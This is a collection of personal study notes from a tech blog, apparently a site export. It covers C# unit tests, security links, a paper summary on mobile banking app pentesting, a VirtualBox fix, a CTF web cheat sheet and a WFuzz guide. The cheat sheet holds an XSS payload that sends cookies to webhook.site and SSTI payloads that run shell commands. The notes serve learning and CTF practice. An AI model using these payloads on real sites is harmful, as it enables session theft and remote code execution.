account = new BankAccount(\u0026#34;Mr. Bryan Walton\u0026#34;, beginningBalance); // Act account.Debit(debitAmount); // Assert double actual = account.Balance; Assert.AreEqual(expected, actual, 0.001, \u0026#34;Account not debited correctly\u0026#34;); } Analyze this part: Assert.AreEqual method will catch the exception when expected value unequal actual value or their difference larger than delta(0.001). Comparing with BankAccount.cs, the truly process of Debit function is $beginningBalance - debitAmount = expected$ -\u0026gt; $11.99 - 4.55 = 7.44$ Build and run the test # On the Build menu, choose Build Solution (or press Ctrl + SHIFT + B) and press Ctrl + E, T to open Test Explorer, then Run All. You\u0026rsquo;ll find that all Test are failed, so you must modify somewhere incorrect. Fix your code and rerun your tests # Return to BankAccount.cs and observe Debit() function. Must change m_balance += amount; to m_balance -= amount; Build and Run the code again and you\u0026rsquo;ll find the test is correct this time Create and run new test methods # Add the following program in test class and rebuild it. [TestMethod] public void Debit_WhenAmountIsLessThanZero_ShouldThrowArgumentOutOfRange() { // Arrange double beginningBalance = 11.99; double debitAmount = -100.00; BankAccount account = new BankAccount(\u0026#34;Mr. Bryan Walton\u0026#34;, beginningBalance); // Act and assert Assert.ThrowsException\u0026lt;System.ArgumentOutOfRangeException\u0026gt;(() =\u0026gt; account.Debit(debitAmount)); } [TestMethod] public void Debit_WhenAmountIsMoreThanBalance_ShouldThrowArgumentOutOfRange() { // Arrange double beginningBalance = 11.99; double debitAmount = 200.00; BankAccount account = new BankAccount(\u0026#34;Mr. Bryan Walton\u0026#34;, beginningBalance); // Act and assert Assert.ThrowsException\u0026lt;System.ArgumentOutOfRangeException\u0026gt;(() =\u0026gt; account.Debit(debitAmount)); } Analyze: you\u0026rsquo;ll find out that the debitAmout in the 1st test method is less than zero and the debitAmount in 2nd test method is larger than beginningBalance. After runing test explorer, these 2 code block are working properly, but you don\u0026rsquo;t know what kind of exception is(amount \u0026gt; m_balance or amount \u0026lt; 0), we just know somewhere throw back an exception message. Revise BankAccount.cs # Trace back to BankAccount.Debit and you\u0026rsquo;ll notice that they used the same exception, so you can determine to use ArgumentOutOfRangeException(String, Object, String) to contain the name of the argument, the argument value, and a user-defined message. if (amount \u0026gt; m_balance) { throw new ArgumentOutOfRangeException(\u0026#34;amount\u0026#34;); } if (amount \u0026lt; 0) { throw new ArgumentOutOfRangeException(\u0026#34;amount\u0026#34;); } Refactor the code under test # Define 2 constants for the error message at class scope, put the following code block in the class under test, BankAccout. public const string DebitAmountExceedsBalanceMessage = \u0026#34;Debit amount exceeds balance\u0026#34;; public const string DebitAmountLessThanZeroMessage = \u0026#34;Debit amount is less than zero\u0026#34;; Then modify the 2 conditional statements in the Debit method. if (amount \u0026gt; m_balance) { throw new System.ArgumentOutOfRangeException(\u0026#34;amount\u0026#34;, amount, DebitAmountExceedsBalanceMessage); } if (amount \u0026lt; 0) { throw new System.ArgumentOutOfRangeException(\u0026#34;amount\u0026#34;, amount, DebitAmountLessThanZeroMessage); } Refactor test method like this. Replacing Assert.ThrowsException with using try/catch method to catch unexpected exception situation. [TestMethod] public void Debit_WhenAmountIsMoreThanBalance_ShouldThrowArgumentOutOfRange() { // Arrange double beginningBalance = 11.99; double debitAmount = 20.0; BankAccount account = new BankAccount(\u0026#34;Mr. Bryan Walton\u0026#34;, beginningBalance); // Act try { account.Debit(debitAmount); } catch (System.ArgumentOutOfRangeException e) { // Assert StringAssert.Contains(e.Message, BankAccount.DebitAmountExceedsBalanceMessage); } } The last part # Not really understatnd about adding Assert.Fail at the end of the test method. Final Result # Reference # Microsoft Learn IThelp-動手寫Unit Test ProgressBar "},{"id":498,"href":"/tools/others/useful-link/","title":"Useful Link","section":"Tools","content":" Useful Link # [TOC]\nKnowledge # Knowledge Comment CRLF VS LF magic method HttpOnly Encrypt VS Hash LFI VS RFI LFI(Local File Inclusion)產生的原因是程式設計師未對用戶參數未進行輸入檢查，導致駭客可以讀取server上的敏感文件。開發人員可能貪圖方便，將GET或POST參數直接設定為檔案名稱，直接include該檔案進網頁裡，結果就造成了引入其他檔案，造成資訊洩漏RFI(Remote File Include)基本上與LFI概念一樣，只是include的file來源變成從外部引入，觸發條件必須要把php設定參數allow_url_include 訂為ON\u0026quot; FTP WebDAV BitTorrent TrueNAS Setup API VS Method VS Library WebSocket JVM Briefly Introduction Thread VS Process APT Arrow VS Dot VS Colon in C++ payload VS formData RAID 0, 1, 0+1, 1+0, 5, 6 How to use multiprocess in python \u0026amp; map VS pool VS apply_async Python asyncio 從不會到上路 JDK、JRE 和 JVM Tool-Page # Tool Comment XSS-CheatSheet All-Injection: SQLMAP1SQLMAP2 ViruTotal 幫忙分析檔案是否有病毒的網站 JS 混淆器 把JS的程式變成可讀性很差的東西 JS 反混淆器 可以反混淆或解密JS的檔案 JS 壓縮+加密+混淆+美化 Everything About Net Scanning How to fetch SHA1 or MD5 in Win. How to split windows in WSL? Docker基本命令 Vocabulary # Vocabulary Def. Comment Parse 解析 query 詢問、請求 dump Also called a crash dump or memory dump, a dump is raw data from a computer\u0026rsquo;s memory. It is written to the file system if software crashes\u0026quot; (terminates unexpectedly). This information is a snapshot of what was going on in the computer at the moment the error occurred. The dump can be analyzed by developers to help track down the error, understand it better, and fix it. Refer intruder 入侵者 vulnerability 漏洞、脆弱 exploit An exploit is a code that takes advantage of a software vulnerability or security flaw. It is written either by security researchers as a proof-of-concept threat or by malicious actors for use in their operations. When used, exploits allow an intruder to remotely access a network and gain elevated privileges, or move deeper into the network. Refer wrapper 偽協議 Cipher 密碼 nerf cause to be weak or ineffective削弱、減弱 Refer Miscellaneous 混雜的、各種各樣的 PoC Proof of Concept：在 Binary Exploitation 通常指可以使程式發⽣ Crash 觸發異常的程式碼，⽤來證明程式存在漏洞 PWN 1.具漏洞的服務2.目標在是服務中找到該服務的漏洞並注入自己的程式碼，拿到 server 的控制權 Refer1Refer2 DHCP 主要功能是自動分配IP(192.168.xxx.xxx)，有時效限制(可能是一天)，當新設備加入區網時，會由DHCP自動分配一個IP給該設備，過了一天後如果設備再次訪問DHCP，則會在給予新的IP，否則該IP會直接回收 秒懂Confusion Matrix IThelp # Information-Security Web-Security Python 惡意程式(malware) Day 4 很像走迷宮的sqlmap [Series - 8] Python時間轉換介紹 不安全的連線？HTTPS與SSL憑證 [Day20]-新手的Web系列SQLmap [第06天] 資料結構（3）Data Frame Day 018.聽起來好像很厲害的-密碼學 Day 12 - PHP 偽協議 (一) dlib安裝心得 \u0026ndash; Windows 環境 Day21-針對Metasploitable 3進行滲透測試(2)-Shell \u0026amp; Reverse Shell基礎知識 [Day13]-SSTI(Server-side template injection) 【Day 9】Python打包程式 [2018iThome鐵人賽]Day6:加密和雜湊有什麼不一樣？ [Day11]SSTI(Server Side Template Injection) [Day28] 儲存訓練好的模型 [2018iThome鐵人賽]Day 4:如何區分加密、壓縮、編碼 [Day7]-PHP(LFI/RFI) [Python]關鍵字yield和return究竟有什麼不同? Day 21.加密演算法要注意的那些毛(一)-加密模式 [Day23]forensics的開始 『Day 27』拜託別Pwn我啦！-常見的工具（下） Deep-Learning Big-Data Linux [演算法]K-means分群(K-means Clustering) [改善資料品質]Part-1 EDA 從沒圖進化到有圖有字的工具：cowsay [第24天] 機器學習（4）分群演算法 Day18-shell是什麼？ [AI#10]人臉辨識 C語言工具使用，GDB個人學習筆記 淺談機器學習的效能衡量指標(2)\u0026ndash;ROC/AUC曲線 [Day15]機器學習常勝軍-XGBoost [Day20]Lasso和Ridge正規化回歸 Web-Develop JS Webpage-Automation 17. [FE] 為什麼現在的前端都在用「框架」？ 你不可不知的 JavaScript 二三事#Day3：資料型態的夢魘——動態型別加弱型別(2) 鼠年全馬鐵人挑戰 WEEK 06：Selenium 自動化測試工具 D29-如何打包Apps Script的程式碼？（二）包成HTML網頁與或API 10. [JS] 一般函式與箭頭函式的差異？ 鼠年全馬鐵人挑戰 WEEK 09：Selenium WebDriver (下) Day03-深入理解網頁架構：DOM 【Day 27】-再爬一次Dcard?(實戰向 Dcard API 發出請求) PHP物件導向的第四課：繼承 [Day23]Beautiful Soup網頁解析！ PHP物件導向的第二課：重談「方法」，物件「屬性」及「成員」 [Day 17] Instagram - 模擬登入 PHP物件導向的第一課：class Day 20 Authentication基礎概念介紹：session、cookie and token Day 17 - 會員登入系統 XAMPP安裝與操作初步 What is metadata? Reverse-Engineering Others PWN [Day10]格式透視-解析PE文件格式（前篇） 第二天：要了解DLL你要先講啊 『 Day 26』拜託別 Pwn 我啦！ - 常見的工具 （上） [Day17] 行為分析－成為逆向大師的第一步－秒懂加殼技術 第四天：Dll聽話 讓我看看 『Day 27』拜託別Pwn我啦！-常見的工具（下） Day16-分散式系統溝通的方法-RPC Day25: [Misc] 我從來沒想過我會害怕寫 code C語言雜談01\u0026mdash;如何理解條件編譯 C#編譯到執行與Java的相似之處 Conference \u0026amp; Journal For Information Security # IEEE TIFS IEEE TDSC ACM TISSEC ACSAC Usenix security "},{"id":499,"href":"/survey-papers/android-+-security/vaptai_-a-threat-model-for-vulnerability-assessment-and-pentesting-of-android-and-ios-mobile-banking-apps/","title":"VAPTAi: A Threat Model for Vulnerability Assessment and Pentesting of Android and iOS Mobile Banking Apps","section":"Survey Papers","content":" VAPTAi: A Threat Model for Vulnerability Assessment and Penetration Testing of Android and iOS Mobile Banking Apps # :::info Bojjagani, S., \u0026amp; Sastry, V. N. (2017, October). VAPTAi: a threat model for vulnerability assessment and penetration testing of android and iOS mobile banking apps. In 2017 IEEE 3rd international conference on collaboration and internet computing (CIC) (pp. 77-86). IEEE. :::\nIntroduction # 隨著移動設備的使用急速增加，Mobile Banking Application(MBA)也備受黑客和惡意使用者的目標。這些MBA存儲、傳輸和存取敏感和機密資訊，因此必須優先確保其安全性。本文提出了一個威脅模型，以系統性地測試和分析行動銀行應用程式，檢測和緩解應用程式級和通信級別的漏洞。作者對5個Android和3個iOS的MBA進行了安全測試，發現了許多未知漏洞，並展示了MBA易受中間人攻擊的情況。部分MBA使用簡單的HTTP協議傳輸用戶數據，未考慮安全要求。多數情況下，MBA無條件接受偽造或自簽名的證書，導致SSL/TLS中間人攻擊。\nBackground # Proposed Method # Threat Type # Insecure Data Storage (V1) 開發團隊假設用戶或惡意軟體無法訪問移動設備的文件系統，在設備上存儲機密數據 Rooting或Jailbreak設備可繞過任何加密保護，讓攻擊者可以使用專門工具查看應用程序數據 Lack of Binary Protection (V2) 移動應用程序缺乏二進制保護，可被攻擊者輕易修改、逆向工程和分析 Unintended Data Leakage (V3) 開發者在移動應用程序開發過程中，無意間將敏感數據放置在設備上的不安全位置 Malware in Apps (V4) 由於Android應用程序在市場上的流行，攻擊者和惡意軟件開發者的主要目標是利用應用程序中的漏洞 Weak Cryptography (V5) 使用了易受攻擊的加密算法或在加密過程中存在缺陷 Insufficient Transport Layer Protection (V6) 移動應用程序與服務器之間的通信使用安全套接層(SSL/TLS)設置不當，可能遭受中間人、重放、網路釣魚等攻擊 Man-in-the-Middle (MitM) Attack Replay Attack Phishing Attack Session Hijacking Masquerade: 攻擊者可以通過偽造MAC地址來假扮任何工作站或無線電站 Traffic Analysis and Wi-Fi Sniffing Account Lock-out attack: 攻擊者可以嘗試多次使用錯誤密碼登錄，導致用戶帳戶被鎖定 Privilege Escalation Attack (V7) Android權限模型主要在應用程序級別運行，攻擊者可利用源碼中的漏洞獲得更高權限 How to test(Static Analysis)? # 主要分析APK文件的結構，包括AndroidManifest.xml清單文件和classes.dex反編譯代碼，檢測不安全的API調用和潛在的數據流洩露問題。使用工具如Drozer、Virus-Total、Apktool等。 ![圖片](https://hackmd.io/_uploads/SkSAbwKVC.png =500x)\nHow to test(Dynamic Analysis)? # 搭建測試環境，包括一台充當惡意接入點的筆記本電腦、一個Cisco無線接入點、一部Android測試手機以及一台模擬銀行伺服器。使用BurpSuite作為中間人代理，攔截手機APP與銀行伺服器之間的通信，監測是否存在證書驗證不當等問題。 ![圖片](https://hackmd.io/_uploads/H120-wK40.png =500x)\nExperiment # Dataset # ![圖片](https://hackmd.io/_uploads/Byi8fdKVR.png =500x) 作者抽取了五個 Android 和三個 iOS 行動銀行應用程式作為樣本，這些應用程式目前由印度國有公共部門銀行部署並由各自的客戶使用。然而，出於安全和聲譽原因，我們對我們考慮測試其銀行應用程式的銀行的確切名稱進行了匿名化。這些銀行大多數都使用外部開發人員（稱為供應商，在表三中匿名為 D1、D2 等）來開發銀行應用程式。\nStatic Analysis # 作者針對五款Android MBA做靜態分析，發現以下漏洞，以及漏洞數量呈如下圖 External storage access 應用程序將敏感數據存儲在外部可訪問的存儲空間，容易遭受數據洩露，主要是利用READ/WRITE_EXTERNAL_STORAGE permission這個API進行讀寫 Exported activities to other apps 在Android應用程序中，活動組件(Activity)默認是不對其他應用程序公開的，但開發者可以將其設置為\u0026quot;exported\u0026quot;(導出)，這樣其他應用程序就可以訪問和利用這些活動組件。論文中提到，在對Android MBA進行靜態分析時發現，部分應用程序將自己的活動組件不當地導出，這可能會帶來以下安全隱患: 權限提升攻擊: 其他惡意應用程序可以通過訪問導出的活動組件，獲得比自身更高的權限。 敏感數據洩露: 導出的活動組件可能包含一些敏感的用戶數據，被其他應用程序讀取和利用。 應用程序功能遭到劫持: 惡意應用程序可以通過調用導出的活動組件，劫持合法應用程序的功能。 Permits data to be stored in back-end databases and restored 應用程序允許將數據備份到後端數據庫，可能導致敏感數據洩露 The app is Debuggable 應用程序被標記為debuggable，攻擊者可利用此漏洞進行更深入的分析和攻擊 Hard-coded cryptographic key 應用程序使用硬編碼的加密密鑰，容易被逆向工程獲取 The app contains native code 什麼是 native code? 在Android應用程序中,除了使用Java寫的代碼外,還可以包含C/C++的本地代碼。這就是所謂的 native code。 為什麼 native code 可能存在安全隱患? 本地代碼是直接與底層系統交互的,相較於高級語言Java,它更容易出現內存管理、邊界檢查等安全漏洞。 這些漏洞可能被攻擊者利用，導致應用程序被破壞、篡改甚至執行任意代碼。 論文中的發現 在對Android MBA進行靜態分析時，作者發現它們都包含了一些本地代碼組件。 由於這些本地代碼沒有經過足夠的安全審查和測試，可能存在一些未知的安全隱患。 解決方案 開發者在使用本地代碼時，應該格外小心謹慎，確保代碼的安全性。 可以考慮使用更安全的技術，如Java Native Interface (JNI)來調用本地代碼，並進行嚴格的輸入驗證。 同時應該對整個應用程序的安全性進行全面評估和測試。 Allows cryptographic algorithms in ECB mode 應用程序使用ECB模式的加密算法，存在安全性問題 Check for dangerous permissions used by the app Android 權限機制: Android系統採用權限機制來控制應用程序對系統資源和敏感數據的訪問。應用程序需要在安裝時申請相應的權限才能訪問特定的系統功能或資源。 危險權限: Android系統將一些權限定義為\u0026quot;dangerous permissions\u0026quot;,因為這些權限可能會給用戶的隱私和安全帶來風險。 例如讀取聯繫人通訊錄、獲取位置信息等權限。 論文中的發現: 在對Android MBA進行靜態分析時,作者發現這些應用程序申請了過多不必要的危險權限。 這可能使應用程序面臨嚴重的安全隱患,因為攻擊者可以利用這些權限竊取用戶敏感數據或進行其他惡意操作。 潛在的危害: 應用程序獲取過多不必要的危險權限,會大大增加用戶的隱私和安全風險。 即使應用程序本身沒有惡意,但仍可能被攻擊者利用這些權限進行各種攻擊活動。 解決方案: 開發者應該審慎評估應用程序所需的權限,儘量減少申請不必要的危險權限。 對於確實需要的權限,也應該向用戶清晰解釋其必要性和用途,獲取用戶的授權同意。 Allows Reflection code 應用程序允許使用反射機制，可能遭受代碼注入攻擊 Uses object Deserialization 應用程式呼叫 java.io.ObjectInputStream.readObject() 方法將物件反序列化到記憶體中。物件反序列化是漏洞的常見來源，特別是當物件可能來自不受信任的來源時。建議盡可能避免物件反序列化，或以其他方式強化 ObjectInputStream 抵禦攻擊。一種強大的強化技術是重寫resolveClass()，僅允許預期的類別。可以透過子類化ObjectInputStream來實現。 Insecure Pseudo-random number generation 應用程序使用不安全的隨機數生成機制，容易被攻擊者預測和利用 Broadcast receivers accessible to other apps 什麼是 Broadcast Receivers?: Broadcast Receivers是Android應用程序中的一種組件,用於接收系統或其他應用程序發送的廣播消息。 漏洞原因: 如果Broadcast Receivers被設置為\u0026quot;exported\u0026quot;(導出),那麼其他應用程序就可以向其發送廣播消息並觸發相應的行為。 這可能導致敏感數據洩露或惡意代碼執行的安全隱患。 論文中的發現: 在對Android MBA進行靜態分析時,作者發現部分應用程序將自己的Broadcast Receivers不當地導出,存在安全風險。 潛在的危害: 惡意應用程序可以向導出的Broadcast Receivers發送特製的廣播消息,從而觸發應用程序的特定功能,如讀取用戶敏感數據。 攻擊者還可以利用導出的Broadcast Receivers進行權限提升或遠程代碼執行等攻擊。 解決方案: 開發者應該仔細檢查自己應用程序中Broadcast Receivers的導出情況,盡量減少不必要的導出。 對於必須導出的Broadcast Receivers,要確保其安全性,如進行權限控制、輸入數據驗證等。 Content providers accessible to other apps and App allows SQL Injection 應用程序的內容提供者未經適當保護，容易遭受SQL注入攻擊 The source code is not Obfuscated 應用程序的源代碼缺乏混淆保護，容易被逆向工程和分析 Logs information 應用程序將敏感信息記錄在未加密的日誌中，存在數據洩露風險 Does app executes environment commands 應用程序允許執行系統命令，可能被攻擊者利用進行提權或遠程控制 Uses cipher that does not provide Integrity 應用程序使用不提供完整性保護的加密方式，容易遭受中間人攻擊 Use of weak security algorithms or hash functions 應用程序採用了安全性較弱的加密算法或雜湊函數，存在破解風險 Weakly configured XML parser 該應用程式可能使用配置不當的 XML 解析庫。如果從不信任的來源解析 XML，則可能會導致 XXE 和DoS 攻擊。建議使用安全處理功能來防止DoS攻擊，並禁止「document type declaration（DTD）」以防止大多數XXE攻擊。如果無法禁止 DTD，則應停用外部實體和外部文件類型。 Weak construction of socket factory 應用程序的socket工廠構建存在安全隱患，可能導致中間人攻擊等問題 Dynamic Analysis # D1-Bank_1 未能正確驗證SSL/TLS證書 使用不安全的加密演算法 在明文形式傳輸敏感數據 ![圖片](https://hackmd.io/_uploads/ryLdJuF4C.png =300x) D2-Bank_2 未對通信進行Integrity Protection，如果被Mitm則使用者不會知道 Phishing: 如果客戶不知道原始伺服器，則應用程式可能會連接到與合法伺服器完全相同的另一台伺服器。基於這個原因，網路釣魚攻擊是可能的 D3-Bank_3 \u0026amp; D3-Bank_4 使用不安全的加密演算法 在明文形式傳輸敏感數據 存在中間人攻擊的風險: 由 D3 應用程式開發人員開發的所有手機銀行應用程式（D3-Bank 3 除外）均表現出與 D3-Bank 4 相同的行為 ![圖片](https://hackmd.io/_uploads/SkEcyuFNC.png =500x) D4-Bank_5 可執行帳戶鎖定攻擊 Conclusion \u0026amp; Future Work # 在本文中，我們提出了一個威脅模型，有助於系統地測試和分析行動銀行應用程式。它有助於檢測和緩解應用程式和通訊層級的漏洞。我們主要關注Android和iOS行動銀行應用程式兩個主要平台的安全測試。本文解決了 MBA 中的各種未知漏洞以及應用程式動態分析過程中 MitM 攻擊的實施。結果表明，即使應用程式使用 HTTPs 協定運行，由於傳輸層保護不足，導致銀行伺服器端和行動應用程式的 SSL 框架實現不佳，因此很容易發生 MitM 攻擊。我們對各種已root、越獄和未越獄的設備進行了安全測試，並識別了常見漏洞。雖然在先前的作品中，作者確定了一些攻擊，但沒有提供緩解漏洞的技術。每個組織、金融機構、銀行和第三方實驗室都需要按照建議進行深入的漏洞評估，每年一次或兩次對MBA進行安全檢查，以發現漏洞和漏洞。因此，本文討論了 MBA 發展的安全性問題。未來的工作包括專注於運行其他平台（例如黑莓和 Windows）的其他行動裝置。然而，需要對安全威脅進行詳細研究，這需要銀行方提供實際的用戶憑證，因此保留為未來的工作。\n"},{"id":500,"href":"/problem-solutions/virtualbox%E6%BB%91%E9%BC%A0%E7%84%A1%E6%B3%95%E8%B7%B3%E5%87%BA/","title":"VirtualBox滑鼠無法跳出","section":"Problem Solutions","content":" VirtualBox滑鼠無法跳出 # Problem Description # 在VirtualBox中如果滑鼠無法跳回本機，請先按照其他blog提出的solution自行排除123，如果暫時找不到解決辦法，也可以參考4的做法，Ctrl+Alt+Del強制本機電腦跳出windows選項，此時滑鼠的控制權就會交回到本機端\nSolution # 我的狀況是鍵盤是新買的小鍵盤，所以沒有Right Ctrl可以用，只有左邊，而且安裝增強功能VirtualBox會一直跳出\u0026quot;無法掛載映像檔\u0026quot;的字樣，最後是參考5中下面有一半教學是示範linux遇到這個問題要如何解決，簡單說就是手動在控制器的地方加入光碟機，並且選擇VBoxGuestAddition.iso，之後重開機就可以了 之後在VM的主視窗中選擇==插入Guest Additions CD映像檔==，就可以在系統中看到CD被掛載上去了，只要按照一般的安裝流程在reboot就可以解決滑鼠自由移動的目的了 Reference # VirtualBox中鼠標在主機和虛擬機之間切換\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n在Windows虛擬機中安裝Virtualbox增強功能\u0026#160;\u0026#x21a9;\u0026#xfe0e;\noracle vm virtualbox 怎麽讓鼠標出來啊？ \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n[VirtualBox] windows下解決移除Host鍵後VM滑鼠無法移出 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nVirtualbox Guest Additions 安裝教學 [Linux / Windows]\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":501,"href":"/tools/ctf/web-cheat-sheet/","title":"Web Cheat Sheet","section":"Tools","content":" Web Cheat Sheet # Online Tools # Fuck Beautifier jsfuck JSNice jjencode JS 反混淆器: 可以反混淆或解密JS的檔案 aaencode JS 壓縮+加密+混淆+美化 Esolang List JS Fuck Decode aadecode Cheat-Sheet # XSS-CheatSheet 利用XSS把session打到webhook上: window.location=\u0026lt;requestbin.com\u0026gt;/?a+document.cookie // or fetch(\u0026#34;https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194\u0026#34;, { method: \u0026#39;GET\u0026#39;, headers: { \u0026#39;Cookie\u0026#39;: document.cookie } }) All-Injection SSTI Payload: 記得找==os._wrap_close== {{().__class__.__base__.__subclasses__()[132].__init__.__globals__[\u0026#39;system\u0026#39;](\u0026#39;id\u0026#39;)}} {{self.__init__.__globals__.__builtins__.__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;cat%20Flag.txt\u0026#34;).read()}} {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[\u0026#39;execl\u0026#39;](\u0026#34;/bin/cat\u0026#34;, \u0026#34;cat\u0026#34;, \u0026#34;./flag.txt\u0026#34;)}} {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[\u0026#39;popen\u0026#39;](\u0026#34;cat /flag.txt\u0026#34;)}} {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[\u0026#39;execl\u0026#39;](\u0026#34;/bin/cat\u0026#34;, \u0026#34;cat\u0026#34;, file.lower())}} {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[\u0026#39;spawnl\u0026#39;](\u0026#39;P_WAIT\u0026#39;, \u0026#34;/bin/cat\u0026#34;, \u0026#34;cat\u0026#34;, file.lower())}} Others # wasm $\\to$ c: wabt # 按照說明build完後進到./build $ ./wasm2c {wasm file path} -o {output c file path} Webhook Webhook.site Beeceptor Ngrok "},{"id":502,"href":"/tools/others/directory-fuzzing---traversal-tools/wfuzz/","title":"WFuzz","section":"Tools","content":" WFuzz # 參考網站-1: https://www.ddosi.org/wfuzz-guide/ 參考網站-2: https://www.ddosi.org/wfuzz/ 參考網站-3: https://www.secpulse.com/archives/78638.html 參考官網-1: https://wfuzz.readthedocs.io/en/latest/user/basicusage.html\nInstallation \u0026amp; Basic Guide # $ git pull https://github.com/xmendez/wfuzz.git 下載下來後總共有==4==個executable file: ==wfencode==, ==wfpayload==, ==wfuzz==, ==wxfuzz==，這四個file實際上就是去執行src/內部的python cli file\npython src/wfuzz-cli.py \u0026#34;$@\u0026#34; python src/wxfuzz.py $@ python src/wfencode.py \u0026#34;$@\u0026#34; python src/wfpayload.py \u0026#34;$@\u0026#34; wfencode # 這個就是encode/decode的script，很單純\n$ wfencode --help Usage: wfencode --help This help wfencode -d decoder_name string_to_decode wfencode -e encoder_name string_to_encode wfencode -e encoder_name -i \u0026lt;\u0026lt;stdin\u0026gt;\u0026gt; 而關於encode/decoder name可以參考wfuzz file的help\n$ wfuzz -e encoder Available encoders: Category | Name | Summary ------------------------------------------------------------------------------------------------------------------------ hashes | base64 | Encodes the given string using base64 url | doble_nibble_hex | Replaces ALL characters in string using the %%dd%dd escape url_safe, url | double_urlencode | Applies a double encode to special characters in string using the %25xx escape. | | Letters, digits, and the characters \u0026#39;_.-\u0026#39; are never quoted. url | first_nibble_hex | Replaces ALL characters in string using the %%dd? escape default | hexlify | Every byte of data is converted into the corresponding 2-digit hex representatio | | n. html | html_decimal | Replaces ALL characters in string using the \u0026amp;#dd; escape html | html_escape | Convert the characters \u0026amp;\u0026lt;\u0026gt;\u0026#34; in string to HTML-safe sequences. html | html_hexadecimal | Replaces ALL characters in string using the \u0026amp;#xx; escape hashes | md5 | Applies a md5 hash to the given string db | mssql_char | Converts ALL characters to MsSQL\u0026#39;s char(xx) db | mysql_char | Converts ALL characters to MySQL\u0026#39;s char(xx) default | none | Returns string without changes db | oracle_char | Converts ALL characters to Oracle\u0026#39;s chr(xx) default | random_upper | Replaces random characters in string with its capitals letters url | second_nibble_hex | Replaces ALL characters in string using the %?%dd escape hashes | sha1 | Applies a sha1 hash to the given string hashes | sha256 | Applies a sha256 hash to the given string hashes | sha512 | Applies a sha512 hash to the given string url | uri_double_hex | Encodes ALL charachers using the %25xx escape. url | uri_hex | Encodes ALL charachers using the %xx escape. url | uri_triple_hex | Encodes ALL charachers using the %25%xx%xx escape. url | uri_unicode | Replaces ALL characters in string using the %u00xx escape url_safe, url | urlencode | Replace special characters in string using the %xx escape. Letters, digits, and | | the characters \u0026#39;_.-\u0026#39; are never quoted. url | utf8 | Replaces ALL characters in string using the \\u00xx escape url | utf8_binary | Replaces ALL characters in string using the \\uxx escape 如何使用\n$ wfencode -e md5 aaa 47bce5c74f589f4867dbd57e9ca9f808 wfpayload # 這個file主要是產生payload，不管是數字、iprange或是name，以下列出一些常見的\n$ wfpayload -e payloads Available payloads: Name | Summary ------------------------------------------------------------------------------------------------------ autorize | Returns fuzz results\u0026#39; from autorize. bing | Returns URL results of a given bing API search (needs api key). buffer_overflow | Returns a string using the following pattern A * given number. burpitem | This payload loads request/response from items saved from Burpsuite. burplog | Returns fuzz results from a Burp log. burpstate | Returns fuzz results from a Burp state. dirwalk | Returns filename\u0026#39;s recursively from a local directory. file | Returns each word from a file. guitab | This payload reads requests from a tab in the GUI hexrand | Returns random hex numbers from the given range. hexrange | Returns each hex number of the given hex range. ipnet | Returns list of IP addresses of a network. iprange | Returns list of IP addresses of a given IP range. list | Returns each element of the given word list separated by -. names | Returns possible usernames by mixing the given words, separated by -, using know | n typical constructions. permutation | Returns permutations of the given charset and length. range | Returns each number of the given range. shodanp | Returns URLs of a given Shodan API search (needs api key). stdin | Returns each item read from stdin. wfuzzp | Returns fuzz results\u0026#39; URL from a previous stored wfuzz session. 如何使用 :::info 如果不知道payload的格式或是哪些module需要安裝，可以使用$ wfpayload -z help --slice \u0026quot;\u0026lt;payload you wanna use\u0026gt;\u0026quot;，就可以知道詳細的格式或範例以及一些基本的說明 :::\n# number(以下三者皆相通) $ wfpayload -z range,0-20 $ wfpayload -z range --zP range=0-20 $ wfpayload -z range --zD 0-20 # iprange(以下三者皆相通) # pip install netaddr $ wfpayload -z iprange,192.168.1.1-192.168.1.255 $ wfpayload -z iprange --zP iprange=192.168.1.1-192.168.1.255 $ wfpayload -z iprange --zD 192.168.1.1-192.168.1.255 # list(以下三者皆相通) $ wfpayload -z list,aaa-bbbb-ccc $ wfpayload -z list --zP values=aaa-bbbb-ccc $ wfpayload -z list --zD aaa-bbbb-ccc # dirwalk(以下三者皆相通) $ wfpayload -z dirwalk,./wordlist $ wfpayload -z dirwalk --zP dir=./wordlist $ wfpayload -z dirwalk --zD ./wordlist # ipnet(以下三者皆相通) $ wfpayload -z ipnet,127.0.0.1/24 $ wfpayload -z ipnet --zP net=127.0.0.1/24 $ wfpayload -z ipnet --zD 127.0.0.1/24 # name(以下三者皆相通) $ wfpayload -z name,sbk-ho $ wfpayload -z name --zP name=sbk-ho $ wfpayload -z name --zD sbk-ho wfuzz \u0026amp; wxfuzz # 基本上wxfuzz是wfuzz的GUI版本，他是利用wxPython進行實作，所以如果會使用CLI就不需要管wxfuzz\nDirectory Scanning # $ wfuzz -c -w wordlist/general/common.txt http://localhost:8065/FUZZ ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://localhost:8065/FUZZ Total requests: 951 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 200 34 L 199 W 3471 Ch \u0026#34;@\u0026#34; 000000003: 200 34 L 199 W 3471 Ch \u0026#34;01\u0026#34; ... 可以看到最一開始有Response Status Code, Lines, Word, Chars等這些index，如果想要過濾/顯示特定的packet，可以使用\n--hc/hl/hw/hh N[,N]+ : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline) --sc/sl/sw/sh N[,N]+ : Show responses with the specified code/lines/words/chars (Use BBB for taking values from baseline) 就是對應上述提到的四個index\n# 想要過濾status code: 404 $ wfuzz -c -w wordlist/general/common.txt --hc 404 http://localhost:8065/FUZZ # 想要過濾chars是3471的packet，以下三者完全相等 $ wfuzz -c -w wordlist/general/common.txt --hh 3471 http://localhost:8065/FUZZ $ wfuzz -c -z file --zD wordlist\\general\\common.txt --hh 3471 http://localhost:8065/FUZZ $ wfuzz -c -z file,wordlist\\general\\common.txt --hh 3471 http://localhost:8065/FUZZ :::info 有一個非常重要的部分是，wfuzz無法自行判斷我給的URL和Fuzz element之間是否只有一個/也就是如果wordlist是/api/v1/about，但我給的testing URL是http://localhost:80/這樣的話拼起來就會是http://localhost:80//api/v1/about，這樣的話就會出錯(web server大機率會無法render)，另外有些web 